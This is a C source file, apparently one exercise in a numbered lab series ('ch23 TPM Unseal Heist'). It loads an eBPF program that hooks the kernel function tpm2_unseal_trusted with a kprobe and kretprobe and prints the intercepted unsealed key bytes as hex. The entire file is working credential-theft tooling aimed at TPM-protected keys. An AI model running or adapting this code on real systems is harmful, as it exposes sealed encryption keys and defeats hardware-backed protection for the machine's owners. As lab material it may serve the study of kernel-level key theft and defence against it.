// ch23 TPM Unseal Heist — userspace loader.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <bpf/libbpf.h>
#include "ch23-tpm-unseal-heist.skel.h"

struct evt {
    unsigned int pid;
    unsigned int key_len;
    unsigned char key_bytes[128];
    char comm[16];
};

static volatile int stop;
static void sig(int _) { stop = 1; }

static int handle(void *ctx __attribute__((unused)), void *data, size_t sz __attribute__((unused)))
{
    struct evt *e = data;
    if (e->key_len == 0) {
        fprintf(stdout, "[ch23] INTERCEPT pid=%u comm=%s kind=entry\n",
                e->pid, e->comm);
        fflush(stdout);
        return 0;
    }
    fprintf(stdout, "[ch23] CAPTURE pid=%u comm=%s captured=%u key_bytes=",
            e->pid, e->comm, e->key_len);
    unsigned int n = e->key_len < 128 ? e->key_len : 128;
    for (unsigned int i = 0; i < n; i++)
        fprintf(stdout, "%02x", e->key_bytes[i]);
    fprintf(stdout, "\n");
    fflush(stdout);
    return 0;
}

static int libbpf_print(enum libbpf_print_level lvl __attribute__((unused)),
                         const char *fmt __attribute__((unused)),
                         va_list ap __attribute__((unused)))
{
    return 0;
}

int main(void)
{
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks) {
        char line[256]; int found = 0;
        while (fgets(line, sizeof(line), ks))
            if (strstr(line, "tpm2_unseal_trusted")) { found = 1; break; }
        fclose(ks);
        if (!found) {
            fprintf(stdout, "[ch23] CH23_SKIP reason=\"tpm2_unseal_trusted not in kallsyms\"\n");
            return 2;
        }
    }

    libbpf_set_print(libbpf_print);

    struct ch23_tpm_unseal_heist_bpf *skel = ch23_tpm_unseal_heist_bpf__open();
    if (!skel) {
        fprintf(stderr, "[ch23] open failed\n"); return 1;
    }
    if (ch23_tpm_unseal_heist_bpf__load(skel)) {
        fprintf(stderr, "[ch23] load failed\n");
        ch23_tpm_unseal_heist_bpf__destroy(skel); return 1;
    }
    if (ch23_tpm_unseal_heist_bpf__attach(skel)) {
        fprintf(stderr, "[ch23] attach failed\n");
        ch23_tpm_unseal_heist_bpf__destroy(skel); return 1;
    }

    fprintf(stdout, "[ch23] attached — kprobe+kretprobe on tpm2_unseal_trusted\n");
    fflush(stdout);

    struct ring_buffer *rb = ring_buffer__new(
        bpf_map__fd(skel->maps.events), handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch23] ring_buffer__new failed\n");
        ch23_tpm_unseal_heist_bpf__destroy(skel); return 1;
    }

    signal(SIGTERM, sig);
    signal(SIGINT, sig);

    while (!stop) {
        int err = ring_buffer__poll(rb, 100);
        if (err < 0 && errno != EINTR) break;
    }

    ring_buffer__free(rb);
    ch23_tpm_unseal_heist_bpf__destroy(skel);
    return 0;
}
